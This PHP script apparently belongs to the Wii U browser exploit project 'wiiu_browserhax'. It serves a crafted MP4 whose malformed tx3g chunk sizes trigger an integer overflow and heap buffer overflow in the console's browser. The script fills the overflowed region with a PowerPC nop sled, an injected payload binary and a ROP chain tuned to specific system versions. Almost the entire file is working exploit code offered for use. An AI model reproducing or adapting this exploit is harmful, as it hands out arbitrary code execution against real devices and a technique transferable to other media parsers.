<?php

require_once("wiiu_browserhax_common.php");

if($sysver==532)
{
	$first_tx3g_size = 0x7800;
}
else if($sysver==550 || $sysver==540)
{
	$first_tx3g_size = 0x8000;
}
$tx3g_ropchain_start = $first_tx3g_size-0x800;

$generatebinrop = 1;
$payload_srcaddr = 0x14572D28-0x5000;
$ROPHEAP = $payload_srcaddr - 0x1000;
generate_ropchain();

$con = pack("N*", 0x18);//ftyp
$con.= pack("N*", 0x66747970); 
$con.= pack("N*", 0x33677036);
$con.= pack("N*", 0x100);
$con.= pack("N*", 0x69736F6D);
$con.= pack("N*", 0x33675336);

$con.= pack("N*", $first_tx3g_size + 0x1000);//moov
$con.= pack("N*", 0x6d6f6f76);

$con.= pack("N*", 0x6c);
$con.= pack("N*", 0x64000000);

$con.= pack("H*", "00000000C95B811AC95B811AFA0002580000022D000100000100000000000000000000000000FFFFF1000000000000000000000000010000000000000000000000000000400000000000000000000000000015696F6473000000001007004FFFFF2803FF");

$con.= pack("N*", $first_tx3g_size + 0x800);
$con.= pack("N*", 0x7472616b);

$con.= pack("N*", 0x5c);
$con.= pack("N*", 0x746b6864);
$con.= pack("H*", "00000001C95B811AC95B811A00000001000000000000022D000000000000000000000000010000000001000000000000000800000000000000010000000000000000000000000000400000000000100000000000");

$con.= pack("N*", $first_tx3g_size);//First tx3g chunk(size+chunkid).
$con.= pack("N*", 0x74783367);

//Setup the data used with the buf-overflow.
for($i=0; $i<$first_tx3g_size-8; $i+=4)//Setup the data which will get copied to the output buffer during buf-overflow. The allocated buffer is actually 4-bytes. This will overwrite the stack for the current thread, on the heap.
{
	if($i<0x6000)
	{
		if($i<0x1000)
		{
			$writeval = 0x60000000;//powerpc nop instruction
		}
		/*else if($i<0x2000)
		{
			$writeval = 0x44444444;
		}
		else if($i<0x3000)
		{
			$writeval = 0x55555555;
		}
		else if($i<0x4000)
		{
			$writeval = 0x66666666;
		}*/
		else if($i<0x5000)
		{
			//$writeval = 0x77777777;
			$payload = wiiuhaxx_generatepayload();
			if($payload === FALSE)
			{
				header("HTTP/1.1 500 Internal Server Error");
				die("The payload binary doesn't exist / is invalid.\n");
			}
			$con.= $payload;

			$i+= strlen($payload)-4;
			if($i+4 >= 0x6000)
			{
				header("HTTP/1.1 500 Internal Server Error");
				die("The payload binary is too large.\n");
			}

			while($i+4 < 0x5000)
			{
				$con.= pack("N*", 0x90909090);
				$i+= 4;
			}

			continue;
		}
		else
		{
			$writeval = 0x58585858;
		}
	}
	else if($i<$tx3g_ropchain_start)
	{
		$writeval = $ROP_POPJUMPLR_STACK12;
	}
	else if($i==$tx3g_ropchain_start)
	{
		$con.= pack("N*", $ROP_POPJUMPLR_STACK12);
		$con.= pack("N*", 0x48484848);//If LR ever gets loaded from here there's no known way to recover from that automatically, this code would need manually adjusted if that ever happens. Hopefully this doesn't ever happen.
		$i+= 0x8;
		$con.= $ROPCHAIN;
		$i+= strlen($ROPCHAIN)-4;

		if($i+4 > $first_tx3g_size-8)
		{
			header("HTTP/1.1 500 Internal Server Error");
			$pos = ($i+4) - ($first_tx3g_size-8);
			die("The generated ROP-chain is $pos bytes too large.\n");
		}

		continue;
	}
	else
	{
		$writeval = 0x48484848;
	}

	$con.= pack("N*", $writeval);
}

$con.= pack("N*", 0x1c5);//Setup the mdia chunk.
$con.= pack("N*", 0x6d646961);

$con.= pack("N*", 0x1);//Setup the second tx3g chunk: size+chunkid, followed by the actual chunk size in u64 form.
$con.= pack("N*", 0x74783367);
$con.= pack("N*", 0x1);
$con.= pack("N*", 0x100000000-$first_tx3g_size);//Haxx buffer alloc size passed to the memalloc code is 0x100000000.

for($i=0; $i<0x2000; $i+=4)//Old stuff, probably should be removed(testing is required for that).
{
	$con.= pack("N*", 0x8495a6b4);
}

header("Content-Type: video/mp4");

echo $con;

?>
